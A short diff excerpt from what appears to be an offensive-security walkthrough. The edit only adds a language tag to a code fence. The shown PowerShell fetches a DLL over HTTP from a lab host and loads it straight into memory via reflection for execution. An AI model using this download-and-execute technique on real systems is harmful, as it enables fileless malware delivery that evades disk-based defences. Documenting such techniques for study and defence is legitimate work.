@@ -74,7 +74,7 @@ python3 -m http.server
 
 now download the DLL into memory and execute it with powershell:
 
-```
+```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/ClassLibrary1.dll')
 $assem = [System.Reflection.Assembly]::Load($data)
 $class = $assem.GetType("ClassLibrary1.Class1")
